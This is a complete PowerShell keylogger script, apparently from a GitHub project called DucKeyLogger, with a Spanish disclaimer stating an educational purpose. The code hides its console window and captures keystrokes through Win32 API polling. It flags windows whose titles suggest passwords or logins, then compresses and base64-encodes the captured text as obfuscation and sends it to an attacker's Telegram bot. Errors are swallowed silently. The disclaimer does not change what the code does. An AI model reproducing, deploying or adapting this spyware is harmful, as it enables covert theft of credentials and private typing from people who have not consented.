
# ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
# █▄─▄▄▀█▄─██─▄█─▄▄▄─█▄─█─▄█▄─▄▄─█▄─█─▄█▄─▄███─▄▄─█─▄▄▄▄█─▄▄▄▄█▄─▄▄─█▄─▄▄▀█
# ██─██─██─██─██─███▀██─▄▀███─▄█▀██▄─▄███─██▀█─██─█─██▄─█─██▄─██─▄█▀██─▄─▄█
# █▄▄▄▄███▄▄▄▄██▄▄▄▄▄█▄▄█▄▄█▄▄▄▄▄██▄▄▄██▄▄▄▄▄█▄▄▄▄█▄▄▄▄▄█▄▄▄▄▄█▄▄▄▄▄█▄▄█▄▄█

# ============================================================================================================ #
# Este software, denominado DucKeyLogger, es propiedad de @marichu_kt.                                         #
# Forma parte del proyecto: https://github.com/marichu-kt/DucKeyLogger                                         #
#                                                                                                              #
# Se proporciona única y exclusivamente con fines educativos y de investigación en seguridad.                  #
# Como autor no me hago responsable del uso indebido, daños o perjuicios derivados de este código.             #
#                                                                                                              #
# El uso de herramientas de registro de teclas (keyloggers) en sistemas o cuentas ajenas,                      #
# sin el consentimiento expreso y por escrito de su propietario, puede vulnerar la legislación                 #
# vigente en materia de protección de datos y delitos informáticos (por ejemplo, normativa                     #
# de protección de datos y el Código Penal del país correspondiente).                                          #
#                                                                                                              #
# Úsalo únicamente en entornos de prueba y siempre con autorización previa y explícita.                        #
# ============================================================================================================ #

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Stealth {
    [DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

$consolePtr = [Stealth]::GetConsoleWindow()
[Stealth]::ShowWindow($consolePtr, 0)

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int k);
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
"@

# Configuración de Telegram
$token = "TU_BOT_TOKEN_AQUI"
$chatId = "TU_CHAT_ID_AQUI"

function Compress-Text {
    param([string]$Text)
    try {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
        $ms = New-Object System.IO.MemoryStream
        $gzip = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
        $gzip.Write($bytes, 0, $bytes.Length)
        $gzip.Close()
        return [Convert]::ToBase64String($ms.ToArray())
    } catch {
        return [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Text))
    }
}

function Send-Telegram {
    param([string]$Message)
    try {
        # Ofuscación: Comprimir y codificar en Base64
        $compressedMessage = Compress-Text $Message
        $body = @{chat_id=$chatId; text=$compressedMessage} | ConvertTo-Json
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 3
    } catch {
        # Manejo de errores silencioso
    }
}

function Get-ActiveWindow {
    $buffer = New-Object Text.StringBuilder 256
    $handle = [WinAPI]::GetForegroundWindow()
    $null = [WinAPI]::GetWindowText($handle, $buffer, 256)
    return $buffer.ToString()
}

Send-Telegram "Keylogger ACTIVADO - $(Get-Date)"

$buffer = ""
$lastSendTime = Get-Date
$keyStates = @{}
$currentWindow = ""
$lastWindow = ""

Write-Host "Keylogger - EJECUTANDOSE"
Write-Host "Envio cada 10 caracteres con ofuscacion..."
Write-Host "Presiona Ctrl+C para detener"

try {
    while ($true) {
        Start-Sleep -Milliseconds 10
        
        # Detectar ventana activa
        $currentWindow = Get-ActiveWindow
        if ($currentWindow -ne $lastWindow -and $currentWindow -ne "") {
            if ($buffer.Length -gt 0) {
                Send-Telegram "[$lastWindow] $buffer"
                $buffer = ""
            }
            
            # Detección de campos sensibles
            $sensitiveKeywords = @("password", "contraseña", "login", "credential", "pwd", "pass", "cuenta", "usuario")
            $isSensitive = $false
            foreach ($keyword in $sensitiveKeywords) {
                if ($currentWindow -like "*$keyword*" -or $currentWindow -like "*$keyword.ToUpper()*") {
                    $isSensitive = $true
                    break
                }
            }
            
            if ($isSensitive) {
                Send-Telegram "CAMPO SENSIBLE DETECTADO: $currentWindow"
            } else {
                Send-Telegram "NUEVA VENTANA: $currentWindow"
            }
            $lastWindow = $currentWindow
        }
        
        $isShiftPressed = [WinAPI]::GetAsyncKeyState(16) -band 0x8000
        $isCapsLock = [Console]::CapsLock
        $isCtrlPressed = [WinAPI]::GetAsyncKeyState(17) -band 0x8000
        $isAltPressed = [WinAPI]::GetAsyncKeyState(18) -band 0x8000
        $currentTime = Get-Date
        
        $keyProcessed = $false
        
        # COMBINACIONES ALT GR
        if ($isCtrlPressed -and $isAltPressed) {
            # AltGr + 2 = @
            if ([WinAPI]::GetAsyncKeyState(50) -band 0x8000 -and -not $keyStates[500]) {
                $buffer += "@"
                $keyProcessed = $true
                $keyStates[500] = $true
                Start-Sleep -Milliseconds 80
            } elseif (-not ([WinAPI]::GetAsyncKeyState(50) -band 0x8000)) {
                $keyStates[500] = $false
            }
            
            # AltGr + 3 = #
            if ([WinAPI]::GetAsyncKeyState(51) -band 0x8000 -and -not $keyStates[501]) {
                $buffer += "#"
                $keyProcessed = $true
                $keyStates[501] = $true
                Start-Sleep -Milliseconds 80
            } elseif (-not ([WinAPI]::GetAsyncKeyState(51) -band 0x8000)) {
                $keyStates[501] = $false
            }
            
            # AltGr + 4 = ~
            if ([WinAPI]::GetAsyncKeyState(52) -band 0x8000 -and -not $keyStates[502]) {
                $buffer += "~"
                $keyProcessed = $true
                $keyStates[502] = $true
                Start-Sleep -Milliseconds 80
            } elseif (-not ([WinAPI]::GetAsyncKeyState(52) -band 0x8000)) {
                $keyStates[502] = $false
            }
            
            # AltGr + E = €
            if ([WinAPI]::GetAsyncKeyState(69) -band 0x8000 -and -not $keyStates[503]) {
                $buffer += "€"
                $keyProcessed = $true
                $keyStates[503] = $true
                Start-Sleep -Milliseconds 80
            } elseif (-not ([WinAPI]::GetAsyncKeyState(69) -band 0x8000)) {
                $keyStates[503] = $false
            }
        }
        
        # Si no se procesó AltGr, verificar teclas normales
        if (-not $keyProcessed) {
            # SÍMBOLOS CON SHIFT
            if ($isShiftPressed) {
                # Shift + 1 = !
                if ([WinAPI]::GetAsyncKeyState(49) -band 0x8000 -and -not $keyStates[1001]) {
                    $buffer += "!"
                    $keyProcessed = $true
                    $keyStates[1001] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(49) -band 0x8000)) {
                    $keyStates[1001] = $false
                }
                
                # Shift + 2 = "
                if ([WinAPI]::GetAsyncKeyState(50) -band 0x8000 -and -not $keyStates[1002]) {
                    $buffer += '"'
                    $keyProcessed = $true
                    $keyStates[1002] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(50) -band 0x8000)) {
                    $keyStates[1002] = $false
                }
                
                # Shift + 3 = ·
                if ([WinAPI]::GetAsyncKeyState(51) -band 0x8000 -and -not $keyStates[1003]) {
                    $buffer += "·"
                    $keyProcessed = $true
                    $keyStates[1003] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(51) -band 0x8000)) {
                    $keyStates[1003] = $false
                }
                
                # Shift + 4 = $
                if ([WinAPI]::GetAsyncKeyState(52) -band 0x8000 -and -not $keyStates[1004]) {
                    $buffer += "$"
                    $keyProcessed = $true
                    $keyStates[1004] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(52) -band 0x8000)) {
                    $keyStates[1004] = $false
                }
                
                # Shift + 5 = %
                if ([WinAPI]::GetAsyncKeyState(53) -band 0x8000 -and -not $keyStates[1005]) {
                    $buffer += "%"
                    $keyProcessed = $true
                    $keyStates[1005] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(53) -band 0x8000)) {
                    $keyStates[1005] = $false
                }
                
                # Shift + 6 = &
                if ([WinAPI]::GetAsyncKeyState(54) -band 0x8000 -and -not $keyStates[1006]) {
                    $buffer += "&"
                    $keyProcessed = $true
                    $keyStates[1006] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(54) -band 0x8000)) {
                    $keyStates[1006] = $false
                }
                
                # Shift + 7 = /
                if ([WinAPI]::GetAsyncKeyState(55) -band 0x8000 -and -not $keyStates[1007]) {
                    $buffer += "/"
                    $keyProcessed = $true
                    $keyStates[1007] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(55) -band 0x8000)) {
                    $keyStates[1007] = $false
                }
                
                # Shift + 8 = (
                if ([WinAPI]::GetAsyncKeyState(56) -band 0x8000 -and -not $keyStates[1008]) {
                    $buffer += "("
                    $keyProcessed = $true
                    $keyStates[1008] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(56) -band 0x8000)) {
                    $keyStates[1008] = $false
                }
                
                # Shift + 9 = )
                if ([WinAPI]::GetAsyncKeyState(57) -band 0x8000 -and -not $keyStates[1009]) {
                    $buffer += ")"
                    $keyProcessed = $true
                    $keyStates[1009] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(57) -band 0x8000)) {
                    $keyStates[1009] = $false
                }
                
                # Shift + 0 = =
                if ([WinAPI]::GetAsyncKeyState(48) -band 0x8000 -and -not $keyStates[1010]) {
                    $buffer += "="
                    $keyProcessed = $true
                    $keyStates[1010] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(48) -band 0x8000)) {
                    $keyStates[1010] = $false
                }
            }
            
            # NÚMEROS NORMALES (solo si no hay Shift y no se procesó otra tecla)
            if (-not $keyProcessed -and -not $isShiftPressed) {
                for ($i = 48; $i -le 57; $i++) {
                    if ([WinAPI]::GetAsyncKeyState($i) -band 0x8000 -and -not $keyStates[$i]) {
                        $buffer += [char]$i
                        $keyProcessed = $true
                        $keyStates[$i] = $true
                        Start-Sleep -Milliseconds 80
                        break
                    } elseif (-not ([WinAPI]::GetAsyncKeyState($i) -band 0x8000)) {
                        $keyStates[$i] = $false
                    }
                }
            }
            
            # LETRAS (solo si no hay AltGr y no se procesó otra tecla)
            if (-not $keyProcessed -and -not ($isCtrlPressed -and $isAltPressed)) {
                for ($i = 65; $i -le 90; $i++) {
                    if ([WinAPI]::GetAsyncKeyState($i) -band 0x8000 -and -not $keyStates[$i]) {
                        if ($isShiftPressed -xor $isCapsLock) {
                            $buffer += [char]$i
                        } else {
                            $buffer += [char]::ToLower([char]$i)
                        }
                        $keyProcessed = $true
                        $keyStates[$i] = $true
                        Start-Sleep -Milliseconds 80
                        break
                    } elseif (-not ([WinAPI]::GetAsyncKeyState($i) -band 0x8000)) {
                        $keyStates[$i] = $false
                    }
                }
            }
            
            # LETRA Ñ (añadida)
            if (-not $keyProcessed -and -not ($isCtrlPressed -and $isAltPressed)) {
                if ([WinAPI]::GetAsyncKeyState(192) -band 0x8000 -and -not $keyStates[192]) {
                    if ($isShiftPressed -or $isCapsLock) {
                        $buffer += "Ñ"
                    } else {
                        $buffer += "ñ"
                    }
                    $keyProcessed = $true
                    $keyStates[192] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(192) -band 0x8000)) {
                    $keyStates[192] = $false
                }
            }
            
            # TECLAS ESPECIALES (solo si no se procesó otra tecla)
            if (-not $keyProcessed) {
                # Espacio
                if ([WinAPI]::GetAsyncKeyState(32) -band 0x8000 -and -not $keyStates[32]) {
                    $buffer += " "
                    $keyProcessed = $true
                    $keyStates[32] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(32) -band 0x8000)) {
                    $keyStates[32] = $false
                }
                
                # Punto
                if ([WinAPI]::GetAsyncKeyState(190) -band 0x8000 -and -not $keyStates[190]) {
                    $buffer += "."
                    $keyProcessed = $true
                    $keyStates[190] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(190) -band 0x8000)) {
                    $keyStates[190] = $false
                }
                
                # Coma
                if ([WinAPI]::GetAsyncKeyState(188) -band 0x8000 -and -not $keyStates[188]) {
                    $buffer += ","
                    $keyProcessed = $true
                    $keyStates[188] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(188) -band 0x8000)) {
                    $keyStates[188] = $false
                }
                
                # Punto y coma
                if ([WinAPI]::GetAsyncKeyState(186) -band 0x8000 -and -not $keyStates[186]) {
                    $buffer += ";"
                    $keyProcessed = $true
                    $keyStates[186] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(186) -band 0x8000)) {
                    $keyStates[186] = $false
                }
                
                # Guión
                if ([WinAPI]::GetAsyncKeyState(189) -band 0x8000 -and -not $keyStates[189]) {
                    $buffer += "-"
                    $keyProcessed = $true
                    $keyStates[189] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(189) -band 0x8000)) {
                    $keyStates[189] = $false
                }
                
                # Barra
                if ([WinAPI]::GetAsyncKeyState(191) -band 0x8000 -and -not $keyStates[191]) {
                    $buffer += "/"
                    $keyProcessed = $true
                    $keyStates[191] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(191) -band 0x8000)) {
                    $keyStates[191] = $false
                }
                
                # Backspace
                if ([WinAPI]::GetAsyncKeyState(8) -band 0x8000 -and -not $keyStates[8]) {
                    if ($buffer.Length -gt 0) {
                        $buffer = $buffer.Substring(0, $buffer.Length - 1)
                    }
                    $keyProcessed = $true
                    $keyStates[8] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(8) -band 0x8000)) {
                    $keyStates[8] = $false
                }
                
                # Enter
                if ([WinAPI]::GetAsyncKeyState(13) -band 0x8000 -and -not $keyStates[13]) {
                    $buffer += "[ENTER]"
                    $keyProcessed = $true
                    $keyStates[13] = $true
                    Start-Sleep -Milliseconds 80
                } elseif (-not ([WinAPI]::GetAsyncKeyState(13) -band 0x8000)) {
                    $keyStates[13] = $false
                }
            }
        }
        
        # ENVÍO CADA 10 CARACTERES
        # if ($buffer.Length -ge 10) {
        #     Send-Telegram "[$currentWindow] $buffer"
        #     $buffer = ""
        #     $lastSendTime = $currentTime
        # }
        
        # Envío de seguridad cada 60 segundos
        if (($currentTime - $lastSendTime).TotalSeconds -ge 60 -and $buffer.Length -gt 0) {
            Send-Telegram "[$currentWindow] [PENDIENTE] $buffer"
            $buffer = ""
            $lastSendTime = $currentTime
        }
    }
} finally {
    if ($buffer.Length -gt 0) {
        Send-Telegram "[FINAL] $buffer"
    }
    Send-Telegram "Keylogger DETENIDO - $(Get-Date)"
}

# ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
# █▄─▀█▀─▄██▀▄▀██▄─▄▄▀█▄─▄█─▄▄▄─█─█─█▄─██─▄████████▄─█─▄█─▄─▄─█
# ██─█▄█─███─▀─███─▄─▄██─██─███▀█─▄─██─██─██████████─▄▀████─███
# █▄▄▄█▄▄▄█▄▄█▄▄█▄▄█▄▄█▄▄▄█▄▄▄▄▄█▄█▄██▄▄▄▄██▄▄▄▄▄██▄▄█▄▄██▄▄▄██
